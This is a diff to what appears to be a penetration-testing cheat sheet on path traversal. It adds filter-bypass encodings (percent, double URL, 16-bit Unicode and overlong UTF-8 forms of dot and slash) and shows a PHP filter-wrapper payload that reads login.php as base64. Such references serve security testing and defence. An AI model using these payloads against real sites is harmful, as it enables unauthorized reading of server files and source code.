@@ -1,3 +1,10 @@
+### Bypass techniques
+- Try / and \ at the start of the folder name to try and reach the root directory.
+- Try %2f and %5c (percent encoded versions of the above).
+- Try using 16-bit Unicode encoding (. = %u002e, / = %u2215, \ = %u2216).
+- Try double URL encoding (. = %252e, / = %252f, \ = %255c).
+- Try overlong UTF-8 Unicode encoding (. can be %c0%2e, %e0%40%ae, %c0ae, / can be %c0%af, %e0%80%af, %c0%2f, etc, \ can be %c0%5c, %c0%80%5c).
+
 ### PHP include page
 ```
 php://filter/convert.base64-encode/resource=../login.php
